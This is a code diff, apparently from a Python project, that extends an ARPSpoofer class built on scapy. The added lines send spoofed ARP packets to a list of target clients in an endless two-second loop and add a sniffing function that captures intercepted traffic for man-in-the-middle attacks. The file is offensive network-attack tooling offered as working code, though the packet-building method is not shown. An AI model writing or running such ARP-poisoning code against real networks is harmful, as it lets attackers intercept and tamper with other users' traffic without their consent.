@@ -3,6 +3,8 @@ from scapy.all import *
 from scapy.layers.l2 import ARP, Ether
 import netifaces
 from logging import getLogger
+import time
+# from scapy.layers.inet import IP, ICMP
 
 logger = getLogger(__name__)
 
@@ -104,8 +106,18 @@ class ARPSpoofer:
         sendp(gateway_packet, verbose=False)
         logger.debug(f"Packets sent: {[client_packet.summary(), gateway_packet.summary()]}")
 
+    def spoofing_func(self, spoof_source=False):
+        logger.debug("Spoofing these clients")
+        logger.debug(self.spoofing_clients)
+        while True:
+            for client in self.spoofing_clients:
+                self._create_and_send_spoofed_packets(client, spoof_source)                
+            time.sleep(2)
+
     def mitm_packet_handler(self, pkt):
         print(pkt.summary())
+    def mitm_func(self):
+        sniff(prn = self.mitm_packet_handler)
 
     # def _create_original_packets(self, client_ip, client_mac):
     #     logger.debug("Creating packets for restoring original IP-MAC")
